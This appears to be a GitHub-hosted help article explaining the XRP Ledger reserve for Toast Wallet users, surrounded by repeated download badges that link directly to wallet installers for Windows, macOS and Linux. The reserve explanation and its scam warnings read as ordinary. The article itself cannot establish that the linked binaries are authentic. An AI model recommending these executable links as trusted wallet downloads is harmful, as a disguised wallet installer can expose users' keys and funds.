<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet XRP reserve explained</h1>

<p align="center">Why part of the balance is locked by the XRP Ledger.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

The XRP Ledger requires every account to hold a minimum amount of XRP, called the reserve. Part of your balance in the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) is therefore locked and cannot be sent while the account exists. It is a rule of the network, not a Toast Wallet fee, and the ledger's validators can change the amount over time.

## 👀 You'll see this if

- Your balance shows a number, but Toast Wallet will not let you send all of it.
- An old guide says Toast Wallet "needs 20 XRP".
- A new account shows as not activated.
- You want to empty an account completely.

## 🤔 Why it happens

The XRP Ledger is a shared public database. To stop people from filling it with millions of empty accounts, the network asks each account to keep a small deposit of XRP. This is the **base reserve**. Each extra object the account owns on the ledger, such as a trust line or an offer, adds an **owner reserve** on top.

The reserve amounts are set by the network's validators and have been lowered several times over the years. That is why older articles and forum posts mention figures like 20 XRP or 10 XRP; those were the values at the time. Today's values are lower. Because they can change, the most reliable view of what you can spend is the balance shown in an up-to-date wallet. Toast Wallet does not take or keep the reserve; it remains in your account on the ledger.

## 🧭 Before you start

Open Toast Wallet and look at your account balance. Note whether the account has been used for anything besides XRP payments. Most Toast users only send and receive XRP, so only the base reserve applies to them.

## 🛠️ Fix: work with the reserve

1. **Check your spendable amount.** Your balance minus the reserve, minus a tiny amount for network fees, is what you can send.
2. **Send slightly less than the maximum.** If a send fails with an insufficient funds message, lower the amount a little. The sending routine is in [send XRP with Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/send-xrp-with-toast-wallet.md).
3. **Activate new accounts with enough XRP.** A brand-new address only exists on the ledger once it receives at least the base reserve. See [activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md).
4. **Keep the reserve when moving to an exchange.** When transferring to an exchange, leave the reserve behind, as explained in [transfer XRP from Toast Wallet to Coinbase](https://github.com/Toast-Wallet/learn/blob/main/how-to/transfer-xrp-from-toast-wallet-to-coinbase.md).
5. **To recover the reserve,** an account can be deleted on the XRP Ledger, which returns most of the reserve to another address. Account deletion has its own network conditions and a higher fee. Treat it as an advanced step and only do it if you fully understand it; most users simply leave the reserve in place.

## 🧩 Real-world example

A user holds 50 XRP in Toast Wallet and tries to send all 50 to a friend. Toast Wallet refuses with an insufficient funds message. They remember the reserve, lower the amount by the reserve plus a small margin, and the payment goes through immediately. The remaining XRP stays safely in their own account, keeping it active on the ledger.

Another user reads a years-old forum post claiming that Toast Wallet "takes 20 XRP". They worry that the wallet charges a fee. In reality the figure was the network reserve at that time, it was never paid to Toast Wallet, and it is lower now.

## ⚠️ Common mistakes

- Thinking the reserve is a fee charged by Toast Wallet.
- Trusting old reserve figures from outdated guides.
- Sending less than the reserve to activate a new account, which fails.
- Following an online guide to "unlock" the reserve that asks for your secret key.

## 🔁 If that did not work

- **The balance shows zero.** That is a different situation; see [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md).
- **You cannot send even a small amount.** Check that your account is activated and that the app is connected to the network.
- **Someone offers to release your reserve for a fee.** That is a scam. Nobody can release it except the account owner through the ledger's own rules.

## 🛡️ Prevention

Expect a portion of every account to stay locked and plan transfers with that in mind. Keep your Toast Wallet up to date so it shows current information. Remember that the reserve belongs to you; it is simply held in your own account.

## 📝 Good to know

The reserve is one reason the XRP Ledger can stay fast and lightweight while remaining open to everyone. It is the same for every wallet, whether desktop, mobile or exchange, because it is enforced by the network itself. If you see different numbers in different places, the difference usually comes from how up to date that source is.

## 🔍 A closer look at checking current values

If you want to know the exact current reserve, rely on up-to-date sources rather than old articles. An up-to-date wallet shows what you can spend. Exchanges often mention the reserve on their withdrawal pages for new addresses. Because validators vote on these values, they can change again in future; this guide therefore avoids fixing a number that might become outdated.

## ❓ FAQ

<details>
<summary>Does Toast Wallet keep the reserve?</summary>

No. The reserve stays in your own account on the XRP Ledger.

</details>

<details>
<summary>Why do old guides say 20 XRP?</summary>

That was the network reserve years ago. Validators have lowered it since.

</details>

<details>
<summary>Is the reserve the same for every account?</summary>

The base reserve is the same. Accounts that own extra ledger objects need a little more.

</details>

> [!WARNING]
> No service can "unlock" your reserve for you. Anyone asking for your secret key or passphrase to do so is a scammer.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md) | Fund a new address with enough XRP to meet the reserve. |
| [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md) | Reasons a balance reads zero and how to confirm your XRP. |
| [Send XRP with Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/send-xrp-with-toast-wallet.md) | Address, tag, amount and passphrase: a careful sending routine. |
| [Transfer XRP from Toast Wallet to Coinbase](https://github.com/Toast-Wallet/learn/blob/main/how-to/transfer-xrp-from-toast-wallet-to-coinbase.md) | Send XRP to an exchange deposit address with the right tag. |
